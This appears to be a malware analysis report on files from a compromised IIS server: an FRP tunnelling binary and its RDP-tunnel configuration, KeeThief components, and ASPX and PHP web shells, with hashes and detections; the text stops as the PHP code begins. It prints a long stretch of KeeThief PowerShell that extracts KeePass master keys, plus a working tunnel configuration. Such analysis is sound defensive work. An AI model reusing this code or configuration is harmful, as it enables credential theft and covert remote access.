Code\n\t\t\t\t\t\tSystem\n\t\t\t\t\t\tSystem.Collections\n\t\t\t\t\t\tSystem.Text\n\t\t\t\t\t\tSystem.Web.UI\n\t\t\t\t\t\tSystem.Collections.Generic\n\t\t\t\t\t\tSystem.Text.RegularExpressions\n\t\t\t\t\t\tSystem.Xml.Linq\n\t\t\t\t\t\tSystem.Web.SessionState\n\t\t\t\t\t\tSystem.Web.Helpers\n\t\t\t\t\t\tSystem.Web.Routing\n\t\t\t\t\t\tSystem.Configuration\n\t\t\t\t\t\tSystem.Collections.Specialized\n\t\t\t\t\t\tSystem.Linq\n\t\t\t\t\t\tSystem.Web\n\t\t\t\t\t\tSystem.Web.DynamicData\n\t\t\t\t\t\tSystem.Web.Caching\n\t\t\t\t\t\tSystem.Web.Profile\n\t\t\t\t\t\tSystem.ComponentModel.DataAnnotations\n\t\t\t\t\t\tSystem.Web.UI.WebControls\n\t\t\t\t\t\tSystem.Web.Mvc.Ajax\n\t\t\t\t\t\tSystem.Web.Security\n\t\t\t\t\t\tSystem.Web.Mvc\n\t\t\t\t\t\tSystem.Web.UI.WebControls.WebParts\n\t\t\t\t\t\tSystem.Web.WebPages\n\t\t\t\t\t\tSystem.Web.Mvc.Html\n\t\t\t\t\t\tSystem.Web.UI.HtmlControls\n\t\t\t\t\t\tget_Profile\n\t\t\t\t\t\tASP\n\t\t\t\t\t\tSystem\n\t\t\t\t\t\tSystem.Collections\n\t\t\t\t\t\tSystem.Text\n\t\t\t\t\t\tSystem.Web.UI\n\t\t\t\t\t\tSystem.Collections.Generic\n\t\t\t\t\t\tSystem.Text.RegularExpressions\n\t\t\t\t\t\tSystem.Xml.Linq\n\t\t\t\t\t\tSystem.Web.SessionState\n\t\t\t\t\t\tSystem.Web.Helpers\n\t\t\t\t\t\tSystem.Web.Routing\n\t\t\t\t\t\tSystem.Configuration\n\t\t\t\t\t\tSystem.Collections.Specialized\n\t\t\t\t\t\tSystem.Linq\n\t\t\t\t\t\tSystem.Web\n\t\t\t\t\t\tSystem.Web.DynamicData\n\t\t\t\t\t\tSystem.Web.Caching\n\t\t\t\t\t\tSystem.Web.Profile\n\t\t\t\t\t\tSystem.ComponentModel.DataAnnotations\n\t\t\t\t\t\tSystem.Web.UI.WebControls\n\t\t\t\t\t\tSystem.Web.Mvc.Ajax\n\t\t\t\t\t\tSystem.Web.Security\n\t\t\t\t\t\tSystem.Web.Mvc\n\t\t\t\t\t\tSystem.Web.UI.WebControls.WebParts\n\t\t\t\t\t\tSystem.Web.WebPages\n\t\t\t\t\t\tSystem.Web.Mvc.Html\n\t\t\t\t\t\tSystem.Web.UI.HtmlControls\n\t\t\t\t\t\tget_SupportAutoEvents\n\n\t\t\t\t\t\tGetEngine\n\t\t\t\t\t\t0600000d\n\t\t\t\t\t\tSetEngine\n\t\t\t\t\t\t0600000e\n\t\t\t\t\t\tASP.aspnet_client_system_web_4_0_30319__vti_cnf_aspx\n\t\t\t\t\t\t87986BFE\n\t\t\t\t\t\t__ASP.FastObjectFactory_app_web_tcnma5bs\n\t\t\t\t\t\t35A8BE76\n\t\t\t\t\t\tJScript 0\n\t\t\t\t\t\t1F3114D0\n\t\t\t\t\t\tJScript 1\n\t\t\t\t\t\t062A2591\n\t\t\t\t\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\t\t\t\t\t\tF:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\n\t\t\t\t\t\tT[@\n\t\t\t\t\t\t/LinkInfo\n\t\t\t\t\t\t/names\n\t\t\t\t\t\t/src/headerblock\n\t\t\t\t\t\t/src/files/f:\\inetpub\\wwwroot\\\\aspnet_client\\system_web\\4_0_30319\\_vti_cnf.aspx\n\t\t\t\t\t\t/src/files/c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\config\\web.config\n\t\t\t\t\t\t\u2014End Strings of Interest\u2014\n55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c\nTags\nproxywebshell\nDetails\n\n\n\nName\nsvchost.exe\n\n\nSize\n10532864 bytes\n\n\nType\nPE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows\n\n\nMD5\nc8bc262d7126c3399baaec3bee89d542\n\n\nSHA1\nc94a0f902b3b8cc4ca5e4cc9004ac9eaa4614699\n\n\nSHA256\n55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c\n\n\nSHA512\ncf7b89d9658e618cb4f590b13bd6a6e5abcba0cddca625c7aeaaafb5ef8821a7a60620b789de4abd5d4505ffe3e9c13ad3bf1173f21e1735df5103f06f7270a9\n\n\nssdeep\n196608:3YHvhq3/BuNnKkOeXtqugiGk9FPHxgc/uA63+w0IUX:kQBuVku1G+\n\n\nEntropy\n6.107183\n\n\n\nAntivirus\n\n\n\nK7\nRiskware ( 0040eff71 )\n\n\nSophos\nApp/FRProxy-A\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n1969-12-31 19:00:00-05:00\n\n\nImport Hash\n91802a615b3a5c4bcc05bc5f66a5b219\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n86ff3a53ecd56eaa856f8c7c28d0a8f1\nheader\n1536\n1.263684\n\n\n26ef590b60778bfdd9bfcbb24d832f94\n.text\n4546560\n5.826487\n\n\nabdb24e1a410aa5fba49a4d1fe6a21bb\n.rdata\n5612032\n5.660454\n\n\n2e993dbff4bcb21d52aa1897a4e2604e\n.data\n370688\n6.023192\n\n\nf006061c21d3eee457ffe5e2c69cba8e\n.idata\n1536\n3.442601\n\n\n07b5472d347d42780469fb2654b7fc54\n.symtab\n512\n0.020393\n\n\n\nDescription\nThis file is a compiled version of the open source utility named FRP. It is an administrative tool, which allows a system inside a router or firewall providing Network Address Translation, to provide network access to systems / operators located outside of the victim's network. For example, the utility could be utilized to tunnel Secure Shell (SSH) protocol connections from an inside system protected by a firewall and router, to a system outside of the firewall perimeter.\nf7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde\nTags\nwebshell\nDetails\n\n\n\nName\ndllhost.dll\n\n\nSize\n226 bytes\n\n\nType\nASCII text, with CRLF line terminators\n\n\nMD5\n14df2e509b6ee8deb3ce6ba3b88e3de0\n\n\nSHA1\n80190bdddf70a79a1735136f81309219c937458d\n\n\nSHA256\nf7ddf2651faf81d2d5fe699f81315bb2cf72bb14d74a1c891424c6afad544bde\n\n\nSHA512\n6a32f2715d554c11eb0a50e39540c9e68bbb387b8a3aa1dfe4604ce6ed22a075fae0c1b3dfd07468746f4d782b1bff203f9036acaff9d6bbd2ab4c0c23b58d08\n\n\nssdeep\n6:eBh3BnEWovv5O4WaundbHAVSVDOUqxTWi:enlcO4WhcSVHqxii\n\n\nEntropy\n5.081345\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a configuration file, which may be utilized with the FRP binary named \"svchost.exe\" (55b9264bc1f665acd94d922dd13522f48f2c88b02b587e50d5665b72855aa71c). The contents of the configuration file is displayed below:\n\n\t\t\t\t\t\t\u2014Begin Configuration Data\u2014\n\t\t\t\t\t\t[common]\n\t\t\t\t\t\tserver_addr = [IP address]\n\t\t\t\t\t\tserver_port = 443\n\t\t\t\t\t\ttls_enable = true\n\t\t\t\t\t\ttoken = laksddflko986wq35029735\n\n\t\t\t\t\t\t[Indy [SCCPV01] - RDP]\n\t\t\t\t\t\ttype = tcp\n\t\t\t\t\t\tuse_encryption = true\n\t\t\t\t\t\tlocal_ip = [IP address]\n\t\t\t\t\t\tlocal_port = 3389\n\t\t\t\t\t\tremote_port = 0\n\t\t\t\t\t\t\u2014End Configuration Data\u2014\n\n\t\t\t\t\t\tThe protocol tunneled is RDP.\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\nTags\ntrojan\nDetails\n\n\n\nName\nkee.ps1\n\n\nSize\n357631 bytes\n\n\nType\nawk or perl script, ASCII text, with very long lines\n\n\nMD5\n3a83cad860a688e1f40683142280a67b\n\n\nSHA1\nd8ad2de372296501c3eb3aa0e053708eb3914113\n\n\nSHA256\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\n\nSHA512\na7afad9c446e55e25ec6289595ebeba469df0ccbc1863c437acf64e63c13b497699804de5248664d5cb78c527ffb9d1415c36a182d32002019cba2e461bb88c3\n\n\nssdeep\n6144:SJU/ny0KiejKvsM7fz0QVd/eHuwF1U1zDtyftQQKasiaUKGY4RpmOHYqmqEqJ7jO:sIyCVjz0QpcU9QlTsZb\n\n\nEntropy\n6.018326\n\n\n\nAntivirus\n\n\n\nBitDefender\nApplication.Hacktool.TJ\n\n\nCyren\nTrojan.NBMZ-8\n\n\nESET\nMSIL/PSW.KeeThief.A trojan\n\n\nIkarus\nTrojan.PowerShell.Pklotide\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n913ee2b048...\nRelated_To\n10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\n\n\nDescription\nThis file is a malicious PowerShell script. It is part of an open source application. The purpose of this script is to decrypt \"keepass\" files in an attempt to steal the victim's password credentials stored on the victim's system. During runtime, this script decodes and utilizes the .NET executable named \"KeeTheft.dll,\"(10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334). A portion of the PowerShell script is displayed below:\n\n\t\t\t\t\t\t\u2014Begin Malicious Powershell Code\u2014\n\t\t\t\t\t\t#requires -version 2\n\t\t\t\t\t\tfunction Get-KP\n\t\t\t\t\t\t{\n\t\t\t\t\t\t[CmdletBinding()]\n\t\t\t\t\t\tparam (\n\t\t\t\t\t\t[Parameter(Position = 0,\n\t\t\t\t\t\tValueFromPipeline = $True)]\n\t\t\t\t\t\t[System.Diagnostics.Process[]]\n\t\t\t\t\t\t[ValidateNotNullOrEmpty()]\n\t\t\t\t\t\t$Process\n\t\t\t\t\t\t)\n\t\t\t\t\t\tBEGIN\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 if(-not $PSBoundParameters['Process'])\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 try\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $Process = Get-Process KeePass -ErrorAction Stop | Where-Object\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $_.FileVersion -match '^2\\.'\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 catch\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 throw 'NO instances open!'\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $EncodedCompressedFile = 'tL0HfFzFET/+7'\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $DeflatedStream = New-Object\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 [IO.Compression.CompressionMode]::Decompress)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $UncompressedFileBytes = New-Object Byte[](738304)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $DeflatedStream.Read($UncompressedFileBytes, 0, 738304) | Out-Null\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $Assembly =\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 [Reflection.Assembly]::Load($UncompressedFileBytes)\n\t\t\t\t\t\t}\n\t\t\t\t\t\tPROCESS\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 ForEach($KeePassProcess in\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 $Process)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 if($KeePassProcess.FileVersion -match '^2\\.')\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $WMIProcess = Get-\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $ExecutablePath =\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $WMIProcess | Select-Object -Expand ExecutablePath\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Write-Verbose \"Examining KeePass\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 process $($KeePassProcess.ID) for master keys\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $Keys = $Assembly.GetType\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ([System.Diagnostics.Process]$KeePassProcess))\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if($Keys)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ForEach\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ($Key in $Keys)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ForEach($UserKey in $Key.UserKeys)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $KeyType = $UserKey.GetType().Name\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject = New-Object PSObject\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if($KeyType -eq 'KcpPassword')\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $Plaintext =\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 else\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $Plaintext = [Convert]::ToBase64String\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ($UserKey.plaintextBlob)\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Member Noteproperty 'Plaintext' $Plaintext\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if($KeyType -eq 'KcpUserAccount')\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 try\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $WMIProcess = Get-WmiObject\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserName =\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $WMIProcess.GetOwner().User\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $ProtectedUserKeyPath = Resolve-Path -Path\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \"$($Env:WinDir | Split-Path -Qualifier)\\Users\\*$UserName*\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 catch\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Write-Warning \"Error\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 enumerating the owner of $($KeePassProcess.ID) : $_\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 else\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject | Add-Member\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Noteproperty 'KeyFilePath' $UserKey.keyFilePath\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $UserKeyObject\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 else\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Write-Verbose \"No keys found for $($KeePassProcess.ID)\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 else\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Write-Warning \"Only KeePass 2.X is supported at this time.\"\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\u2014End Malicious Powershell Code\u2014\n10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\nTags\ntrojan\nDetails\n\n\n\nName\nKeeTheft.dll\n\n\nSize\n738304 bytes\n\n\nType\nPE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\ndc8a91125f273090cd8d76e9e588a074\n\n\nSHA1\n3455ecca61a280a1056adb69077e0c652daa3516\n\n\nSHA256\n10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\n\nSHA512\ndc25e2ff93871edeb751e99cafe0717163817bfa85bd41c941c1c8b1b5ad2c63b9935060475b65dda69edce358f2759160ce94ad663c041bd41dbbd48e464cb4\n\n\nssdeep\n12288:NxOU+wucIYOW1ENXKUEHI7apPYEMMIjS3K9TodHNSIIcOECQ:NETcIYOWCNXKUEHI7apPYEMJ9TgHDpC\n\n\nEntropy\n6.023616\n\n\n\nAntivirus\n\n\n\nAhnlab\nTrojan/Win32.Tiggre\n\n\nAvira\nTR/PSW.KeeThief.vmqvn\n\n\nBitDefender\nGen:Variant.Ursu.299323\n\n\nESET\na variant of MSIL/PSW.KeeThief.A trojan\n\n\nEmsisoft\nGen:Variant.Ursu.299323 (B)\n\n\nIkarus\nTrojan.MSIL.PSW\n\n\nK7\nPassword-Stealer ( 005253fd1 )\n\n\nMcAfee\nGenericRXIL-CE!DC8A91125F27\n\n\nMicrosoft Security Essentials\nPWS:MSIL/KeeThief\n\n\nSymantec\nTrojan.Gen.MBT\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2016-07-11 14:54:24-04:00\n\n\nImport Hash\nf34d5f2d4577ed6d9ceec516c1f5a744\n\n\nFile Description\nKeeTheft\n\n\nInternal Name\nKeeTheft.exe\n\n\nLegal Copyright\nCopyright \u00a9 2016\n\n\nOriginal Filename\nKeeTheft.exe\n\n\nProduct Name\nKeeTheft\n\n\nProduct Version\n1.0.0.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\ncb77191ad61291924938362fbb902f32\nheader\n512\n2.783814\n\n\n1fb4a5b09d9141362ed994c8a99b3cf5\n.text\n735744\n6.030226\n\n\n2801de31bb6a6306f169ef81e5589521\n.rsrc\n1536\n4.076679\n\n\necf88595c12869be20d521f1934da506\n.reloc\n512\n0.101910\n\n\n\nRelationships\n\n\n\n10836bda2d...\nRelated_To\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\n\n\nDescription\nThis file is a Windows executable written in the .NET programming language. This binary has been identified as the KeyTheft application, which is part of the \"KeeThief\" open source project. The primary purpose of this executable is to assist in the stealing of password credentials from the \"KeePass Password Safe\" password management utility software. Using this malware, an operator will be able to decrypt and extract passwords from a \"KeePass\" safe, allowing access to sensitive user data and possibly the ability pivot to the victim's user accounts outside of the victim's network.\nScreenshots\n \nFigure 1 -\u00a0Screenshot of a list of some of the source .NET files used to build this app. It matches the name of some of the source files contained within the \"KeeThief\" open source project.\n \nFigure 2 -\u00a0Screenshot of a list of source files within the \"KeeThief\" open source project.\n \nFigure 3 -\u00a0Screenshot of .NET code decompiled from the \"KcpPassword\" file contained within this binary.\n \nFigure 4 -\u00a0Screenshot of .NET code found on the \"KeeThief\" project's GitHub page, which matches the code extracted from this malicious file.\n51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21\nTags\nwebshell\nDetails\n\n\n\nName\ndf5bd34799e200951fcce77c1c0b42af.php\n\n\nSize\n585 bytes\n\n\nType\nPHP script, ASCII text\n\n\nMD5\nb3b1dea400464ab5dd55e44766357957\n\n\nSHA1\n507a04d3faed99cee089da042913d63f1813fc2a\n\n\nSHA256\n51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21\n\n\nSHA512\nf7c21a4171942edd7e0d4ab7c0b3a3a1666a3dbbed14da6af4ae3c41c7607301c0c3bc83782e22c47fe40b5297a9c1374d645d04ce3b22cebf5a54d2d92ed5bb\n\n\nssdeep\n12:yDsNaficuJwHCaBzVBbgKOBUbC3c2vaveaXivglQEyKzbShL:4sCicuJwiaRVVeubCs+ieaXiY1HShL\n\n\nEntropy\n5.136531\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a component of a malicious web shell. It contains two PHP code blocks. The first block extracts information from a dictionary data structure named \"$_FILES\". Analysis indicates the script extracts provided file data, such as file name, file type, file size, and the files in a temporary location. The block then calls a function named \u201cmove_uploaded_files\u201d. This PHP block is presumably utilized by a web shell framework to allow a remote operator to move uploaded files to a new location on the compromised system. The code contained in the function \u201cmove_uploaded_file\u201d was not available for analysis.\n\n\t\t\t\t\t\tThe second PHP script block parses the variable $_GET for the value associated with the \u201ccmd\u201d key value. This value is then executed on the target system using the \u201csystem()\u201d function. This PHP block is utilized by a web shell framework to allow a remote operator to remotely execute commands on a compromised system. Displayed below is the (partial) code contained within this file:\n\n\t\t\t\t\t\t\u2014Begin PHP Script\u2014\n\t\t\t\t\t\tif ($_FILES[\"file\"][\"error\"] > 